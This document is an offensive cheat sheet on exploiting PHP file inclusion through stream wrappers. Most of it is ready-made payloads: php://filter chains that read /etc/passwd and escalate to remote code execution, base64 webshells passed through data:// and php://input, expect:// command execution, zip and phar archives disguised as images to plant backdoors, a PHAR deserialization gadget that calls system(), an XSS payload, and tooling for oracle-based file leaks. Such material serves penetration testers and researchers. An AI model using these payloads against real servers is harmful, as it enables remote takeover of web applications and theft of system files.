# Inclusion Using Wrappers

A wrapper in the context of file inclusion vulnerabilities refers to the protocol or method used to access or include a file. Wrappers are often used in PHP or other server-side languages to extend how file inclusion functions, enabling the use of protocols like HTTP, FTP, and others in addition to the local filesystem.

## Summary

- [Wrapper php://filter](#wrapper-phpfilter)
- [Wrapper data://](#wrapper-data)
- [Wrapper expect://](#wrapper-expect)
- [Wrapper input://](#wrapper-input)
- [Wrapper zip://](#wrapper-zip)
- [Wrapper phar://](#wrapper-phar)
    - [PHAR Archive Structure](#phar-archive-structure)
    - [PHAR Deserialization](#phar-deserialization)
- [Wrapper convert.iconv:// and dechunk://](#wrapper-converticonv-and-dechunk)
    - [Leak file content from error-based oracle](#leak-file-content-from-error-based-oracle)
    - [Leak file content inside a custom format output](#leak-file-content-inside-a-custom-format-output)
- [References](#references)


## Wrapper php://filter

The part "`php://filter`" is case insensitive

| Filter | Description |
| ------ | ----------- |
| `php://filter/read=string.rot13/resource=index.php` | Display index.php as rot13 |
| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | Encode index.php from utf8 to utf16  |
| `php://filter/convert.base64-encode/resource=index.php` | Display index.php as a base64 encoded string |


```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Wrappers can be chained with a compression wrapper for large files.

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

NOTE: Wrappers can be chained multiple times using `|` or `/`:

- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- deflate then `base64encode` (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

Also there is a way to turn the `php://filter` into a full RCE. 

* [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - A CLI to generate PHP filters chain
  ```powershell
  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
  [+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
  ```

* [LFI2RCE.py](./LFI2RCE.py) to generate a custom payload.
  ```powershell
  # vulnerable file: index.php
  # vulnerable parameter: file
  # executed command: id
  # executed PHP code: <?=`$_GET[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
  ```


## Wrapper data://

The payload encoded in base64 is "`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`".

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`


## Wrapper expect://

When used in PHP or a similar application, it may allow an attacker to specify commands to execute in the system's shell, as the `expect://` wrapper can invoke shell commands as part of its input.

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```


## Wrapper input://

Specify your payload in the POST parameters, this can be done with a simple `curl` command.

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

Alternatively, Kadimus has a module to automate this attack.

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

## Wrapper zip://

1. Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
2. Zip the file
  ```python
  zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
  ```
3. Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php


## Wrapper phar://

### PHAR archive structure

PHAR files work like ZIP files, when you can use the `phar://` to access files stored inside them.

1. Create a phar archive containing a backdoor file: `php --define phar.readonly=0 archive.php`

  ```php
  <?php
    $phar = new Phar('archive.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
  ?>
  ```

2. Use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`


### PHAR deserialization

:warning: This technique doesn't work on PHP 8+, the deserialization has been removed. 

If a file operation is now performed on our existing phar file via the `phar://` wrapper, then its serialized meta data is unserialized. This vulnerability occurs in the following functions, including file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, etc.

This exploit requires at least one class with magic methods such as `__destruct()` or `__wakeup()`.
Let's take this `AnyClass` class as example, which execute the parameter data.

```php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);
```

We can craft a phar archive containing a serialized object in its meta-data.

```php
// create new Phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add object of any class as meta data
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

Finally call the phar wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`

NOTE: you can use the `$phar->setStub()` to add the magic bytes of JPG file: `\xff\xd8\xff`

```php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```


## Wrapper convert.iconv:// and dechunk://

### Leak file content from error-based oracle

- `convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)
- `dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if the string starts with A-Fa-f0-9

The goal of this exploitation is to leak the content of a file, one character at a time, based on the [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py) writeup.
 
**Requirements**:

- Backend must not use `file_exists` or `is_file`.
- Vulnerable parameter should be in a `POST` request. 
  - You can't leak more than 135 characters in a GET request due to the size limit

The exploit chain is based on PHP filters: `iconv` and `dechunk`:

1. Use the `iconv` filter with an encoding increasing the data size exponentially to trigger a memory error.
2. Use the `dechunk` filter to determine the first character of the file, based on the previous error.
3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.


Exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), the script will use either the `HTTP status code: 500` or the time as an error-based oracle to determine the character.

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

### Leak file content inside a custom format output

* [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.

To obtain the contents of some file, we would like to have: `{"message":"<file contents>"}`.

```ps1
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

This can be used against vulnerable code like the following.

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

### Leak file content using blind file read primitive

* [ambionics/lightyear](https://github.com/ambionics/lightyear)

```ps1
code remote.py # edit Remote.oracle
./lightyear.py test # test that your implementation works
./lightyear.py /etc/passwd # dump a file!
```


## References

* [Baby^H Master PHP 2017 - Orange Tsai (@orangetw) - Dec 5, 2021](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
* [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - May 27, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
* [Introducing lightyear: a new way to dump PHP files - Charles Fol - November 4, 2024](https://www.ambionics.io/blog/lightyear-file-dump)
* [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - December 11, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
* [It's A PHP Unserialization Vulnerability Jim But Not As We Know It - Sam Thomas - August 10, 2018](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
* [New PHP Exploitation Technique - Dr. Johannes Dahse - August 14, 2018](https://web.archive.org/web/20180817103621/https://blog.ripstech.com/2018/new-php-exploitation-technique/)
* [OffensiveCon24 - Charles Fol- Iconv, Set the Charset to RCE - June 14, 2024](https://youtu.be/dqKFHjcK9hM)
* [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - March 21, 2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
* [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - October 18, 2022](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
* [Solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop - December 30, 2021](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)